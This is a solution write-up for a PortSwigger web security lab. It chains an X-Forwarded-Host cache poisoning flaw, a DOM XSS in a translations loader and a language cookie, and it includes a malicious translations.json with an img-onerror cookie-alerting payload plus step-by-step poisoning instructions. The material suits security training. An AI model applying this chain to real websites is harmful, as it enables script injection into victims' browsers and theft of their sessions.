# Lab 10 — Combining web cache poisoning vulnerabilities

> **Expert** · [Official lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities)

**Entry point:** `X-Forwarded-Host` (translations.json import) + DOM XSS in
`initTranslations()` + the `lang` cookie — chain them and force the
victim's language.

## Solution

1. Host a malicious `/resources/json/translations.json` on the exploit
   server (add `Access-Control-Allow-Origin: *`), with an XSS payload in a
   non-English translation:

```json
{"es": {"name": "español", "translations": {
  "Return to list": "Volver a la lista",
  "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
  "Description:": "Descripción"}}}
```

2. Poison the Spanish page (`lang=es` cookie): in Repeater use a request
   with `Cookie: lang=es`, add a buster + `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`,
   replay until `X-Cache: hit`.
3. Force the English-set victim to Spanish: the language-change request
   `?localized=1` is cacheable and unkeyed by lang — poison a Spanish-page
   entry they'll hit (follow the lab's flow to serve them `lang=es`).
4. The victim's browser loads your translations.json → DOM XSS fires —
   lab solved.

## Notes

One poison controls *content*, the other controls *which cache entry* the
victim receives — real-world poisoning usually needs exactly this kind of
combination.
